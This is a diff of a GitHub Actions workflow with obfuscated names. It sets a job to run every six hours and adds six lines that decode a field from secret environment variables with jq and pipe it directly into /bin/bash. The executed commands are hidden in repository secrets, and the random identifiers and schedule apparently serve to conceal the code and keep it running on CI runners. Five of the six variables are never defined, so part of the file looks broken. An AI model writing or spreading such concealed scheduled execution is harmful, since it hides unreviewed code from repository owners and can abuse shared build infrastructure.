@@ -1,9 +1,8 @@
 name: pengzhongzhou2013
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 0/6 * * *'
+    - cron: '19 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: pengzhongzhou2013
         env:
-          cv0311: ${{ secrets.cv0311 }}
+          l0669: ${{ secrets.l0669 }}
         run: |
-          echo $cv0311 | jq -r .y9 | /bin/bash
-          echo $lap847 | jq -r .ixddc471 | /bin/bash
-          echo $xpw753 | jq -r .ntnc50 | /bin/bash
-          echo $rskv998 | jq -r .ktfk500 | /bin/bash
-          echo $hamxr1 | jq -r .wax32 | /bin/bash
-          echo $oc602 | jq -r .zt3826 | /bin/bash
+          echo $l0669 | jq -r .st8741 | /bin/bash
+          echo $cts5337 | jq -r .oirnj39095 | /bin/bash
+          echo $jvm1 | jq -r .sdc2 | /bin/bash
+          echo $k66 | jq -r .ugydp5486 | /bin/bash
+          echo $cox6571 | jq -r .haew31 | /bin/bash
+          echo $rzsy04349 | jq -r .a28665 | /bin/bash
 
